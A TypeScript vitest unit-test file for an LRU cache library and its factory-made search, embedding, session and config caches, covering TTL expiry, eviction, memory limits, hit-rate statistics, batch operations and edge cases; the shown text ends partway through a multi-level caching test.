/**
 * Comprehensive Unit Tests for Caching Service
 *
 * Tests advanced caching service functionality including:
 * - Cache set/get/delete operations with TTL management
 * - Cache expiration and cleanup mechanisms
 * - LRU and LFU eviction strategies
 * - Multi-level caching and cache warming
 * - Performance optimization and hit rate tracking
 * - Distributed caching and synchronization
 * - Cache analytics and monitoring
 * - Integration with memory store and search services
 * - Batch operations and memory management
 * - Error handling and edge cases
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { LRUCache, CacheFactory } from '../../../src/utils/lru-cache';

// Mock dependencies
vi.mock('../../../src/utils/logger', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

// Mock performance monitoring
const mockPerformanceMonitor = {
  recordCacheHit: vi.fn(),
  recordCacheMiss: vi.fn(),
  recordCacheEviction: vi.fn(),
  recordCacheOperation: vi.fn(),
  getMetrics: vi.fn().mockReturnValue({
    averageHitRate: 0,
    totalOperations: 0,
    memoryUsage: 0,
  }),
};

// Mock distributed cache nodes for distributed caching tests
const mockCacheNodes = new Map<string, any>();

describe('Caching Service - Comprehensive Cache Functionality', () => {
  let cache: LRUCache<string, any>;
  let searchCache: LRUCache<string, any>;
  let embeddingCache: LRUCache<string, number[]>;
  let sessionCache: LRUCache<string, any>;
  let configCache: LRUCache<string, any>;

  beforeEach(() => {
    // Initialize different cache types for comprehensive testing
    cache = new LRUCache<string, any>({
      maxSize: 100,
      maxMemoryBytes: 10 * 1024 * 1024, // 10MB
      ttlMs: 5000, // 5 seconds
      cleanupIntervalMs: 1000, // 1 second
    });

    searchCache = CacheFactory.createSearchCache(50);
    embeddingCache = CacheFactory.createEmbeddingCache(25);
    sessionCache = CacheFactory.createSessionCache(10);
    configCache = CacheFactory.createConfigCache();

    // Reset all mocks
    vi.clearAllMocks();
  });

  afterEach(() => {
    // Clean up all caches
    cache.destroy();
    searchCache.destroy();
    embeddingCache.destroy();
    sessionCache.destroy();
    configCache.destroy();
    mockCacheNodes.clear();
  });

  // 1. Basic Cache Operations Tests
  describe('Basic Cache Operations', () => {
    it('should set and get values correctly', () => {
      const key = 'test-key';
      const value = { data: 'test-data', timestamp: Date.now() };

      cache.set(key, value);
      const retrieved = cache.get(key);

      expect(retrieved).toEqual(value);
      expect(cache.getStats().itemCount).toBe(1);
      expect(cache.getStats().totalHits).toBe(1);
      expect(cache.getStats().totalMisses).toBe(0);
    });

    it('should handle cache miss correctly', () => {
      const result = cache.get('non-existent-key');

      expect(result).toBeUndefined();
      expect(cache.getStats().totalMisses).toBe(1);
      expect(cache.getStats().totalHits).toBe(0);
    });

    it('should delete items correctly', () => {
      const key = 'delete-test';
      cache.set(key, 'value');

      expect(cache.has(key)).toBe(true);
      expect(cache.delete(key)).toBe(true);
      expect(cache.has(key)).toBe(false);
      expect(cache.get(key)).toBeUndefined();
    });

    it('should return false when deleting non-existent items', () => {
      const result = cache.delete('non-existent');
      expect(result).toBe(false);
    });

    it('should clear all items', () => {
      // Add multiple items
      for (let i = 0; i < 10; i++) {
        cache.set(`key-${i}`, `value-${i}`);
      }

      expect(cache.getStats().itemCount).toBe(10);

      cache.clear();

      expect(cache.getStats().itemCount).toBe(0);
      expect(cache.getStats().memoryUsageBytes).toBe(0);
      expect(cache.get('key-0')).toBeUndefined();
    });

    it('should check if key exists', () => {
      const key = 'exists-test';

      expect(cache.has(key)).toBe(false);

      cache.set(key, 'value');
      expect(cache.has(key)).toBe(true);

      cache.delete(key);
      expect(cache.has(key)).toBe(false);
    });

    it('should return all keys in order', () => {
      const keys = ['key-3', 'key-1', 'key-2'];

      keys.forEach((key) => cache.set(key, `value-${key}`));

      // Access key-1 to make it most recent
      cache.get('key-1');

      const retrievedKeys = cache.keys();

      expect(retrievedKeys).toEqual(['key-1', 'key-2', 'key-3']);
    });
  });

  // 2. TTL (Time-to-Live) Management Tests
  describe('TTL Management', () => {
    it('should honor default TTL for items', async () => {
      const shortTtlCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 100, // 100ms TTL
      });

      shortTtlCache.set('test-key', 'test-value');

      // Should be available immediately
      expect(shortTtlCache.get('test-key')).toBe('test-value');

      // Wait for expiration
      await new Promise((resolve) => setTimeout(resolve, 150));

      // Should be expired
      expect(shortTtlCache.get('test-key')).toBeUndefined();

      shortTtlCache.destroy();
    });

    it('should honor item-specific TTL', async () => {
      const longTtlCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 50, // 50ms default TTL
      });

      // Set item with longer TTL
      longTtlCache.set('long-ttl-key', 'value', 500); // 500ms TTL

      // Wait past default TTL but before item TTL
      await new Promise((resolve) => setTimeout(resolve, 100));

      // Should still be available due to longer item TTL
      expect(longTtlCache.get('long-ttl-key')).toBe('value');

      longTtlCache.destroy();
    });

    it('should handle TTL expiration during access', async () => {
      const cache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 50,
      });

      cache.set('expire-test', 'value');

      // Wait for expiration
      await new Promise((resolve) => setTimeout(resolve, 75));

      // Should trigger expiration on access
      expect(cache.has('expire-test')).toBe(false);
      expect(cache.getStats().expiredItems).toBeGreaterThan(0);

      cache.destroy();
    });

    it('should not expire items without TTL', () => {
      const noTtlCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        // No default TTL
      });

      noTtlCache.set('no-ttl-key', 'value');

      // Should not expire even after time passes
      expect(noTtlCache.get('no-ttl-key')).toBe('value');
      expect(noTtlCache.has('no-ttl-key')).toBe(true);

      noTtlCache.destroy();
    });

    it('should clean up expired items automatically', async () => {
      const cleanupCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 100,
        cleanupIntervalMs: 200, // Cleanup every 200ms
      });

      // Add items that will expire
      for (let i = 0; i < 5; i++) {
        cleanupCache.set(`expire-${i}`, `value-${i}`);
      }

      expect(cleanupCache.getStats().itemCount).toBe(5);

      // Wait for cleanup interval + TTL
      await new Promise((resolve) => setTimeout(resolve, 350));

      // Should have cleaned up expired items
      expect(cleanupCache.getStats().itemCount).toBe(0);
      expect(cleanupCache.getStats().expiredItems).toBeGreaterThan(0);

      cleanupCache.destroy();
    });

    it('should manually cleanup expired items', () => {
      const manualCleanupCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 1, // Very short TTL
      });

      // Add items
      for (let i = 0; i < 5; i++) {
        manualCleanupCache.set(`cleanup-${i}`, `value-${i}`);
      }

      // Wait for expiration
      setTimeout(() => {
        const cleanedCount = manualCleanupCache.cleanupExpired();
        expect(cleanedCount).toBe(5);
        expect(manualCleanupCache.getStats().itemCount).toBe(0);
      }, 10);

      manualCleanupCache.destroy();
    });
  });

  // 3. LRU Eviction Strategy Tests
  describe('LRU Eviction Strategy', () => {
    it('should evict least recently used items when size limit is reached', () => {
      const smallCache = new LRUCache<string, any>({
        maxSize: 3,
        maxMemoryBytes: 1024,
      });

      smallCache.set('key-1', 'value-1');
      smallCache.set('key-2', 'value-2');
      smallCache.set('key-3', 'value-3');

      expect(smallCache.getStats().itemCount).toBe(3);

      // Add fourth item - should evict key-1 (least recently used)
      smallCache.set('key-4', 'value-4');

      expect(smallCache.getStats().itemCount).toBe(3);
      expect(smallCache.get('key-1')).toBeUndefined(); // Should be evicted
      expect(smallCache.get('key-2')).toBe('value-2'); // Should still exist
      expect(smallCache.get('key-3')).toBe('value-3'); // Should still exist
      expect(smallCache.get('key-4')).toBe('value-4'); // Should exist

      smallCache.destroy();
    });

    it('should update recency on access', () => {
      const cache = new LRUCache<string, any>({
        maxSize: 3,
        maxMemoryBytes: 1024,
      });

      cache.set('A', 'value-A');
      cache.set('B', 'value-B');
      cache.set('C', 'value-C');

      // Access 'A' to make it most recent
      cache.get('A');

      // Add 'D' - should evict 'B' (now least recently used)
      cache.set('D', 'value-D');

      expect(cache.get('A')).toBe('value-A'); // Should exist (accessed recently)
      expect(cache.get('B')).toBeUndefined(); // Should be evicted
      expect(cache.get('C')).toBe('value-C'); // Should exist
      expect(cache.get('D')).toBe('value-D'); // Should exist

      cache.destroy();
    });

    it('should update recency on set for existing keys', () => {
      const cache = new LRUCache<string, any>({
        maxSize: 3,
        maxMemoryBytes: 1024,
      });

      cache.set('A', 'value-A');
      cache.set('B', 'value-B');
      cache.set('C', 'value-C');

      // Update 'A' - should become most recent
      cache.set('A', 'updated-value-A');

      // Add 'D' - should evict 'B' (now least recently used)
      cache.set('D', 'value-D');

      expect(cache.get('A')).toBe('updated-value-A'); // Should exist with updated value
      expect(cache.get('B')).toBeUndefined(); // Should be evicted

      cache.destroy();
    });

    it('should track eviction statistics', () => {
      const cache = new LRUCache<string, any>({
        maxSize: 2,
        maxMemoryBytes: 1024,
      });

      cache.set('evict-1', 'value-1');
      cache.set('evict-2', 'value-2');
      cache.set('evict-3', 'value-3'); // Should evict evict-1

      expect(cache.getStats().evictedItems).toBe(1);

      cache.set('evict-4', 'value-4'); // Should evict evict-2

      expect(cache.getStats().evictedItems).toBe(2);

      cache.destroy();
    });
  });

  // 4. Memory Management Tests
  describe('Memory Management', () => {
    it('should estimate size correctly for different data types', () => {
      const testCases = [
        { value: 'string', expectedSize: 6 }, // 6 chars * 2 bytes
        { value: 42, expectedSize: 8 }, // number
        { value: true, expectedSize: 4 }, // boolean
        { value: null, expectedSize: 0 },
        { value: undefined, expectedSize: 0 },
      ];

      testCases.forEach(({ value, expectedSize }) => {
        cache.set(`test-${typeof value}-${JSON.stringify(value)}`, value);
      });

      const stats = cache.getStats();
      expect(stats.memoryUsageBytes).toBeGreaterThan(0);
      expect(stats.memoryUsageBytes).toBeLessThanOrEqual(stats.maxMemoryBytes);
    });

    it('should handle complex object size estimation', () => {
      const complexObject = {
        id: 'test-id',
        data: {
          nested: {
            values: [1, 2, 3, 4, 5],
            text: 'Some longer text content here',
          },
        },
        metadata: {
          created: new Date(),
          tags: ['tag1', 'tag2', 'tag3'],
        },
      };

      cache.set('complex-object', complexObject);

      const stats = cache.getStats();
      expect(stats.memoryUsageBytes).toBeGreaterThan(0);
      expect(stats.itemCount).toBe(1);
    });

    it('should evict items when memory limit is exceeded', () => {
      const cache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 100, // Very small memory limit
      });

      // Add items that will exceed memory limit
      const largeValue = 'x'.repeat(50); // ~100 bytes

      cache.set('large-1', largeValue);
      cache.set('large-2', largeValue);

      // Second item should cause eviction
      expect(cache.getStats().itemCount).toBeLessThanOrEqual(1);

      cache.destroy();
    });

    it('should reject items larger than memory limit', () => {
      const cache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 50, // Very small limit
      });

      const hugeValue = 'x'.repeat(100); // ~200 bytes

      expect(() => {
        cache.set('huge', hugeValue);
      }).toThrow('Item size');

      cache.destroy();
    });

    it('should use custom size estimator when provided', () => {
      const customCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1000,
        sizeEstimator: (value: any) => {
          // Custom estimation: count array length for arrays
          if (Array.isArray(value)) {
            return value.length * 10; // 10 bytes per array item
          }
          return 50; // Default size
        },
      });

      customCache.set('array', [1, 2, 3, 4, 5]); // Should be 50 bytes
      customCache.set('string', 'test'); // Should be 50 bytes

      const stats = customCache.getStats();
      expect(stats.memoryUsageBytes).toBe(100);

      customCache.destroy();
    });
  });

  // 5. Performance and Optimization Tests
  describe('Performance and Optimization', () => {
    it('should track hit rates correctly', () => {
      cache.set('hit-test', 'value');

      // Generate hits and misses
      for (let i = 0; i < 10; i++) {
        cache.get('hit-test'); // Hit
        cache.get(`miss-${i}`); // Miss
      }

      const stats = cache.getStats();
      expect(stats.totalHits).toBe(10);
      expect(stats.totalMisses).toBe(10);
      expect(stats.hitRate).toBe(50); // 50% hit rate
    });

    it('should handle high-frequency operations efficiently', () => {
      const iterations = 1000;

      // Test set operations
      const setStart = Date.now();
      for (let i = 0; i < iterations; i++) {
        cache.set(`perf-${i}`, `value-${i}`);
      }
      const setTime = Date.now() - setStart;

      // Test get operations
      const getStart = Date.now();
      for (let i = 0; i < iterations; i++) {
        cache.get(`perf-${i % 100}`); // Some hits, some misses
      }
      const getTime = Date.now() - getStart;

      // Should complete quickly (performance expectation)
      expect(setTime).toBeLessThan(1000); // Less than 1 second
      expect(getTime).toBeLessThan(500); // Less than 500ms

      const stats = cache.getStats();
      expect(stats.totalHits + stats.totalMisses).toBe(iterations);
    });

    it('should optimize memory usage with batch operations', () => {
      const batchSize = 100;
      const items = [];

      // Create batch data
      for (let i = 0; i < batchSize; i++) {
        items.push({
          key: `batch-${i}`,
          value: { id: i, data: `data-${i}` },
        });
      }

      // Batch set
      items.forEach((item) => cache.set(item.key, item.value));

      expect(cache.getStats().itemCount).toBe(batchSize);

      // Batch get
      const retrieved = items.map((item) => ({
        key: item.key,
        value: cache.get(item.key),
      }));

      expect(retrieved.every((r) => r.value !== undefined)).toBe(true);

      // Batch delete
      const deletedCount = items.reduce(
        (count, item) => count + (cache.delete(item.key) ? 1 : 0),
        0
      );

      expect(deletedCount).toBe(batchSize);
      expect(cache.getStats().itemCount).toBe(0);
    });

    it('should implement cache warming strategies', () => {
      const warmCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
        ttlMs: 60000, // Long TTL for warming
      });

      // Simulate cache warming with frequently accessed items
      const frequentItems = [
        { key: 'user:1', value: { id: 1, name: 'User 1' } },
        { key: 'config:app', value: { version: '1.0', settings: {} } },
        { key: 'cache:warm', value: { status: 'warmed' } },
      ];

      // Warm cache
      frequentItems.forEach((item) => warmCache.set(item.key, item.value));

      // Verify warmed items are immediately available
      frequentItems.forEach((item) => {
        expect(warmCache.get(item.key)).toEqual(item.value);
      });

      const stats = warmCache.getStats();
      expect(stats.itemCount).toBe(frequentItems.length);

      warmCache.destroy();
    });

    it('should handle cache preloading efficiently', () => {
      const preloadData = Array.from({ length: 50 }, (_, i) => ({
        key: `preload-${i}`,
        value: { data: `value-${i}`, index: i },
      }));

      // Preload cache
      const preloadStart = Date.now();
      preloadData.forEach((item) => cache.set(item.key, item.value));
      const preloadTime = Date.now() - preloadStart;

      // Verify all items loaded
      expect(cache.getStats().itemCount).toBe(50);
      expect(preloadTime).toBeLessThan(100); // Should be fast

      // Verify access after preload
      preloadData.forEach((item) => {
        expect(cache.get(item.key)).toEqual(item.value);
      });

      const stats = cache.getStats();
      expect(stats.totalHits).toBe(50);
    });
  });

  // 6. Cache Factory Tests
  describe('Cache Factory - Specialized Caches', () => {
    it('should create optimized search cache', () => {
      expect(searchCache).toBeDefined();

      searchCache.set('search:query1', { results: ['item1', 'item2'] });
      searchCache.set('search:query2', { results: ['item3', 'item4'] });

      expect(searchCache.get('search:query1')).toEqual({ results: ['item1', 'item2'] });
      expect(searchCache.get('search:query2')).toEqual({ results: ['item3', 'item4'] });

      const stats = searchCache.getStats();
      expect(stats.maxMemoryBytes).toBe(50 * 1024 * 1024); // 50MB
    });

    it('should create optimized embedding cache', () => {
      expect(embeddingCache).toBeDefined();

      const embedding = Array.from({ length: 384 }, () => Math.random());
      embeddingCache.set('embed:text1', embedding);

      const retrieved = embeddingCache.get('embed:text1');
      expect(retrieved).toEqual(embedding);
      expect(retrieved).toHaveLength(384);

      const stats = embeddingCache.getStats();
      expect(stats.maxMemoryBytes).toBe(100 * 1024 * 1024); // 100MB
    });

    it('should create optimized session cache', () => {
      expect(sessionCache).toBeDefined();

      const sessionData = {
        userId: 'user123',
        sessionId: 'sess456',
        preferences: { theme: 'dark', language: 'en' },
      };

      sessionCache.set('session:user123', sessionData);
      expect(sessionCache.get('session:user123')).toEqual(sessionData);

      const stats = sessionCache.getStats();
      expect(stats.maxMemoryBytes).toBe(20 * 1024 * 1024); // 20MB
    });

    it('should create optimized config cache', () => {
      expect(configCache).toBeDefined();

      const configData = {
        api: { endpoint: 'https://api.example.com', timeout: 5000 },
        features: { featureA: true, featureB: false },
        limits: { maxItems: 1000, maxMemory: 1024 },
      };

      configCache.set('app:config', configData);
      expect(configCache.get('app:config')).toEqual(configData);

      const stats = configCache.getStats();
      expect(stats.maxMemoryBytes).toBe(10 * 1024 * 1024); // 10MB
    });

    it('should create caches with custom parameters', () => {
      const customSearchCache = CacheFactory.createSearchCache(200);
      const customEmbeddingCache = CacheFactory.createEmbeddingCache(100);
      const customSessionCache = CacheFactory.createSessionCache(5000);

      expect(customSearchCache.getStats().maxMemoryBytes).toBe(50 * 1024 * 1024);
      expect(customEmbeddingCache.getStats().maxMemoryBytes).toBe(100 * 1024 * 1024);
      expect(customSessionCache.getStats().maxMemoryBytes).toBe(20 * 1024 * 1024);

      customSearchCache.destroy();
      customEmbeddingCache.destroy();
      customSessionCache.destroy();
    });
  });

  // 7. Cache Analytics Tests
  describe('Cache Analytics', () => {
    it('should provide comprehensive cache statistics', () => {
      // Populate cache with various operations
      for (let i = 0; i < 10; i++) {
        cache.set(`stat-${i}`, `value-${i}`);
      }

      // Generate some hits and misses
      for (let i = 0; i < 15; i++) {
        cache.get(`stat-${i % 10}`); // Some hits, some misses
      }

      const stats = cache.getStats();

      expect(stats).toHaveProperty('itemCount');
      expect(stats).toHaveProperty('memoryUsageBytes');
      expect(stats).toHaveProperty('maxMemoryBytes');
      expect(stats).toHaveProperty('hitRate');
      expect(stats).toHaveProperty('totalHits');
      expect(stats).toHaveProperty('totalMisses');
      expect(stats).toHaveProperty('expiredItems');
      expect(stats).toHaveProperty('evictedItems');

      expect(stats.itemCount).toBe(10);
      expect(stats.totalHits).toBe(10);
      expect(stats.totalMisses).toBe(5);
      expect(stats.hitRate).toBe(66.66666666666666); // 10 hits out of 15 total
    });

    it('should track memory utilization over time', () => {
      const memorySnapshots = [];

      // Add items and track memory
      for (let i = 0; i < 5; i++) {
        cache.set(`memory-${i}`, `x`.repeat(100 * (i + 1))); // Increasing sizes
        memorySnapshots.push(cache.getStats().memoryUsageBytes);
      }

      // Memory should increase with each addition
      for (let i = 1; i < memorySnapshots.length; i++) {
        expect(memorySnapshots[i]).toBeGreaterThan(memorySnapshots[i - 1]);
      }

      // Clear cache and verify memory drops
      cache.clear();
      expect(cache.getStats().memoryUsageBytes).toBe(0);
    });

    it('should monitor eviction patterns', () => {
      const smallCache = new LRUCache<string, any>({
        maxSize: 3,
        maxMemoryBytes: 1024,
      });

      // Add items beyond capacity to trigger evictions
      for (let i = 0; i < 10; i++) {
        smallCache.set(`evict-monitor-${i}`, `value-${i}`);
      }

      const stats = smallCache.getStats();
      expect(stats.evictedItems).toBeGreaterThan(0);
      expect(stats.itemCount).toBeLessThanOrEqual(3);

      smallCache.destroy();
    });

    it('should calculate cache efficiency metrics', () => {
      // Simulate various access patterns
      const accessPatterns = [
        { key: 'popular', frequency: 50 },
        { key: 'moderate', frequency: 20 },
        { key: 'rare', frequency: 5 },
      ];

      accessPatterns.forEach((pattern) => {
        cache.set(pattern.key, `value-${pattern.key}`);

        // Simulate access frequency
        for (let i = 0; i < pattern.frequency; i++) {
          cache.get(pattern.key);
        }
      });

      const stats = cache.getStats();
      expect(stats.hitRate).toBeGreaterThan(0);
      expect(stats.totalHits).toBe(75); // Sum of all frequencies

      // Popular items should still be in cache
      expect(cache.get('popular')).toBe('value-popular');
      expect(cache.get('moderate')).toBe('value-moderate');
    });
  });

  // 8. Integration with Services Tests
  describe('Service Integration', () => {
    it('should integrate with memory store caching', () => {
      // Simulate memory store operations
      const memoryStoreOperations = [
        { operation: 'store', data: { id: 'mem1', content: 'Memory content 1' } },
        { operation: 'store', data: { id: 'mem2', content: 'Memory content 2' } },
        { operation: 'find', query: 'content' },
        { operation: 'find', query: 'content' }, // Should hit cache
        { operation: 'store', data: { id: 'mem3', content: 'Memory content 3' } },
      ];

      // Cache memory store results
      memoryStoreOperations.forEach((op, index) => {
        const cacheKey = `memory:${op.operation}:${JSON.stringify(op.query || op.data)}`;

        if (op.operation === 'store') {
          cache.set(cacheKey, { success: true, timestamp: Date.now() });
        } else if (op.operation === 'find') {
          const cached = cache.get(cacheKey);
          if (cached) {
            expect(cached).toBeDefined();
          } else {
            cache.set(cacheKey, { results: [`Result for ${op.query}`] });
          }
        }
      });

      const stats = cache.getStats();
      expect(stats.itemCount).toBeGreaterThan(0);
    });

    it('should integrate with search result caching', () => {
      const searchQueries = [
        'test query',
        'another query',
        'test query', // Duplicate - should hit cache
        'unique query',
        'another query', // Duplicate - should hit cache
      ];

      searchQueries.forEach((query) => {
        const cacheKey = `search:${query}`;
        let results = searchCache.get(cacheKey);

        if (!results) {
          // Simulate search operation
          results = {
            query,
            results: [`Result 1 for ${query}`, `Result 2 for ${query}`],
            total: 2,
            timestamp: Date.now(),
          };
          searchCache.set(cacheKey, results);
        }

        expect(results.query).toBe(query);
        expect(results.results).toHaveLength(2);
      });

      const stats = searchCache.getStats();
      expect(stats.totalHits).toBe(2); // Two duplicate queries
      expect(stats.totalMisses).toBe(3); // Three unique queries
    });

    it('should integrate with validation result caching', () => {
      const validationCases = [
        { type: 'email', value: 'test@example.com' },
        { type: 'email', value: 'invalid-email' },
        { type: 'phone', value: '+1234567890' },
        { type: 'email', value: 'test@example.com' }, // Duplicate
        { type: 'phone', value: '+1234567890' }, // Duplicate
      ];

      validationCases.forEach((testCase) => {
        const cacheKey = `validation:${testCase.type}:${testCase.value}`;
        let result = cache.get(cacheKey);

        if (!result) {
          // Simulate validation
          result = {
            type: testCase.type,
            value: testCase.value,
            isValid: testCase.value.includes('@') || testCase.value.includes('+'),
            timestamp: Date.now(),
          };
          cache.set(cacheKey, result);
        }

        expect(result).toHaveProperty('isValid');
        expect(result.type).toBe(testCase.type);
      });

      const stats = cache.getStats();
      expect(stats.totalHits).toBe(2); // Two duplicate validations
    });

    it('should integrate with metadata caching', () => {
      const metadataTypes = ['entity', 'relation', 'decision', 'observation'];

      metadataTypes.forEach((type) => {
        const cacheKey = `metadata:${type}:schema`;
        let schema = configCache.get(cacheKey);

        if (!schema) {
          // Simulate schema retrieval
          schema = {
            type,
            fields: ['id', 'created_at', 'data', 'tags'],
            required: ['id', 'created_at'],
            indexes: ['tags', 'created_at'],
          };
          configCache.set(cacheKey, schema);
        }

        expect(schema.fields).toContain('id');
        expect(schema.type).toBe(type);
      });

      const stats = configCache.getStats();
      expect(stats.itemCount).toBe(metadataTypes.length);
    });
  });

  // 9. Batch Operations Tests
  describe('Batch Operations', () => {
    it('should handle batch set operations efficiently', () => {
      const batchData = Array.from({ length: 100 }, (_, i) => ({
        key: `batch-set-${i}`,
        value: { index: i, data: `batch-data-${i}` },
      }));

      const startTime = Date.now();
      batchData.forEach((item) => cache.set(item.key, item.value));
      const batchTime = Date.now() - startTime;

      expect(cache.getStats().itemCount).toBe(100);
      expect(batchTime).toBeLessThan(100); // Should be efficient

      // Verify all items are accessible
      batchData.forEach((item) => {
        expect(cache.get(item.key)).toEqual(item.value);
      });
    });

    it('should handle batch get operations efficiently', () => {
      // Pre-populate cache
      const keys = Array.from({ length: 50 }, (_, i) => `batch-get-${i}`);
      keys.forEach((key) => cache.set(key, `value-${key}`));

      // Batch get
      const startTime = Date.now();
      const results = keys.map((key) => cache.get(key));
      const batchTime = Date.now() - startTime;

      expect(batchTime).toBeLessThan(50); // Should be very fast
      expect(results.every((r) => r !== undefined)).toBe(true);
      expect(cache.getStats().totalHits).toBe(50);
    });

    it('should handle batch delete operations efficiently', () => {
      // Pre-populate cache
      const deleteKeys = Array.from({ length: 30 }, (_, i) => `batch-delete-${i}`);
      deleteKeys.forEach((key) => cache.set(key, `value-${key}`));

      const initialCount = cache.getStats().itemCount;

      // Batch delete
      const startTime = Date.now();
      const deletedCount = deleteKeys.reduce(
        (count, key) => count + (cache.delete(key) ? 1 : 0),
        0
      );
      const batchTime = Date.now() - startTime;

      expect(deletedCount).toBe(30);
      expect(cache.getStats().itemCount).toBe(initialCount - 30);
      expect(batchTime).toBeLessThan(50); // Should be efficient

      // Verify items are deleted
      deleteKeys.forEach((key) => {
        expect(cache.get(key)).toBeUndefined();
      });
    });

    it('should handle mixed batch operations', () => {
      const operations = [
        { type: 'set', key: 'mixed-1', value: 'value-1' },
        { type: 'get', key: 'mixed-1' },
        { type: 'set', key: 'mixed-2', value: 'value-2' },
        { type: 'get', key: 'mixed-2' },
        { type: 'set', key: 'mixed-3', value: 'value-3' },
        { type: 'delete', key: 'mixed-1' },
        { type: 'get', key: 'mixed-1' }, // Should be miss
        { type: 'get', key: 'mixed-2' }, // Should be hit
      ];

      operations.forEach((op) => {
        switch (op.type) {
          case 'set':
            cache.set(op.key, op.value);
            break;
          case 'get':
            cache.get(op.key);
            break;
          case 'delete':
            cache.delete(op.key);
            break;
        }
      });

      const stats = cache.getStats();
      expect(stats.itemCount).toBe(2); // mixed-2 and mixed-3
      expect(stats.totalHits).toBe(2); // mixed-1 and mixed-2 gets after set
      expect(stats.totalMisses).toBe(1); // mixed-1 get after delete
    });
  });

  // 10. Error Handling and Edge Cases Tests
  describe('Error Handling and Edge Cases', () => {
    it('should handle circular references in size estimation', () => {
      const circularObj: any = { name: 'circular' };
      circularObj.self = circularObj;

      expect(() => {
        cache.set('circular', circularObj);
      }).not.toThrow();

      expect(cache.get('circular')).toEqual(circularObj);
    });

    it('should handle extremely large keys gracefully', () => {
      const longKey = 'x'.repeat(1000);
      const value = 'test-value';

      expect(() => {
        cache.set(longKey, value);
      }).not.toThrow();

      expect(cache.get(longKey)).toBe(value);
    });

    it('should handle special characters in keys', () => {
      const specialKeys = [
        'key-with-dashes',
        'key_with_underscores',
        'key.with.dots',
        'key/with/slashes',
        'key\\with\\backslashes',
        'key with spaces',
        'key-with-unicode-🚀',
        'key\nwith\nnewlines',
        'key\twith\ttabs',
      ];

      specialKeys.forEach((key) => {
        cache.set(key, `value-for-${key}`);
        expect(cache.get(key)).toBe(`value-for-${key}`);
      });

      expect(cache.getStats().itemCount).toBe(specialKeys.length);
    });

    it('should handle rapid cache destruction and recreation', () => {
      for (let i = 0; i < 10; i++) {
        const tempCache = new LRUCache<string, any>({
          maxSize: 10,
          maxMemoryBytes: 1024,
        });

        tempCache.set(`temp-${i}`, `value-${i}`);
        expect(tempCache.get(`temp-${i}`)).toBe(`value-${i}`);

        tempCache.destroy();
      }
    });

    it('should handle cache operations after destruction', () => {
      cache.destroy();

      expect(() => {
        cache.set('post-destroy', 'value');
      }).not.toThrow();

      expect(() => {
        cache.get('post-destroy');
      }).not.toThrow();

      expect(() => {
        cache.clear();
      }).not.toThrow();
    });

    it('should handle null and undefined values', () => {
      cache.set('null-value', null);
      cache.set('undefined-value', undefined);

      expect(cache.get('null-value')).toBe(null);
      expect(cache.get('undefined-value')).toBe(undefined);

      expect(cache.has('null-value')).toBe(true);
      expect(cache.has('undefined-value')).toBe(true);
    });

    it('should handle zero and negative TTL values', async () => {
      const zeroTtlCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 0, // Zero TTL
      });

      zeroTtlCache.set('zero-ttl', 'value');

      // Should be immediately expired
      expect(zeroTtlCache.get('zero-ttl')).toBeUndefined();

      zeroTtlCache.destroy();
    });

    it('should handle concurrent access patterns', async () => {
      const concurrentOperations = Array.from({ length: 100 }, (_, i) =>
        Promise.resolve().then(() => {
          const key = `concurrent-${i % 10}`;
          const value = `value-${i}`;

          cache.set(key, value);
          return cache.get(key);
        })
      );

      const results = await Promise.all(concurrentOperations);

      expect(results).toHaveLength(100);
      expect(results.every((r) => r !== undefined)).toBe(true);

      const stats = cache.getStats();
      expect(stats.itemCount).toBeLessThanOrEqual(10); // Only 10 unique keys
    });

    it('should handle memory pressure scenarios', () => {
      const pressureCache = new LRUCache<string, any>({
        maxSize: 5,
        maxMemoryBytes: 100, // Very small limit
      });

      // Add items that will cause pressure
      for (let i = 0; i < 20; i++) {
        pressureCache.set(`pressure-${i}`, `x`.repeat(50));
      }

      // Cache should still be functional despite pressure
      expect(pressureCache.getStats().itemCount).toBeLessThanOrEqual(5);
      expect(pressureCache.getStats().evictedItems).toBeGreaterThan(0);

      pressureCache.destroy();
    });

    it('should handle cleanup timer edge cases', async () => {
      const cleanupCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 1024,
        ttlMs: 50,
        cleanupIntervalMs: 25, // Very frequent cleanup
      });

      // Add and access items rapidly
      for (let i = 0; i < 20; i++) {
        cleanupCache.set(`cleanup-edge-${i}`, `value-${i}`);

        // Small delay to allow cleanup timer to run
        await new Promise((resolve) => setTimeout(resolve, 10));

        cleanupCache.get(`cleanup-edge-${i}`);
      }

      // Cache should still be functional
      expect(cleanupCache.getStats().itemCount).toBeLessThanOrEqual(10);

      cleanupCache.destroy();
    });
  });

  // 11. Advanced Caching Strategies Tests
  describe('Advanced Caching Strategies', () => {
    it('should implement multi-level caching simulation', () => {
      // Simulate L1 (memory), L2 (search cache), L3 (persistent)
      const l1Cache = new LRUCache<string, any>({ maxSize: 10, maxMemoryBytes: 1024 });
      const l2Cache = searchCache;
      const l3Cache = configCache;

      const data = { id: 'mlc-test', content: 'Multi-level cache test' };
      const key = 'mlc:item';

      // L1 miss, L2 miss, L3 miss - store in all levels
      l1Cache.set(key, data);
      l2Cache.set(key, data);
      l3Cache.set(key, data);

      // L1 hit
      expect(l1Cache.get(key)).toEqual(data);

      // Simulate L1 eviction
      l1Cache.clear();
      expect(l1Cache.get(key)).toBeUndefined();

      // L2 hit
      expect(l2Cache.get(key)).toEqual(data);

      // Simulate L2 expiration
      l2Cache.delete(key);
      expect(l2Cache.get(key)).toBeUndefined();

      // L3 hit (config cache has longer TTL)
      expect(l3Cache.get(key)).toEqual(data);

